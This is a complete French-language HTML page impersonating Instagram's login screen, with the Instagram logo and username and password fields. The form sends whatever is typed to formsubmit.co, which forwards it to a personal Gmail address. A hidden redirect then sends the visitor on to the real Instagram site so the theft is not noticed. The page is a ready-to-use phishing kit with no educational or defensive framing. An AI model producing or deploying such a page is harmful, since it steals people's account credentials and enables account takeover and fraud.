<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Instagram Login</title>
</head>
<body style="text-align:center; font-family:Arial; background:#111; color:white;">
  <!-- Logo Instagram -->
  <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" 
       alt="Instagram" 
       style="width:100px; margin-top:50px;">
  
  <form action="https://formsubmit.co/yassinebouatay4@gmail.com" method="POST" style="margin-top:30px;">
    <!-- Redirection vers Instagram après soumission -->
    <input type="hidden" name="_next" value="https://www.instagram.com/">
    
    <input type="text" name="username" placeholder="Nom d'utilisateur, email ou téléphone" required style="width:250px; padding:10px; margin:5px;"><br>
    <input type="password" name="password" placeholder="Mot de passe" required style="width:250px; padding:10px; margin:5px;"><br>
    <input type="submit" value="Se connecter" style="width:250px; padding:10px; margin:10px; background:#0095f6; color:white; border:none;">
  </form>
  
  <p><a href="#" style="color:#0095f6;">Mot de passe oublié ?</a></p>
  <p><a href="#" style="color:#0095f6;">Créer un nouveau compte</a></p>
</body>
</html>
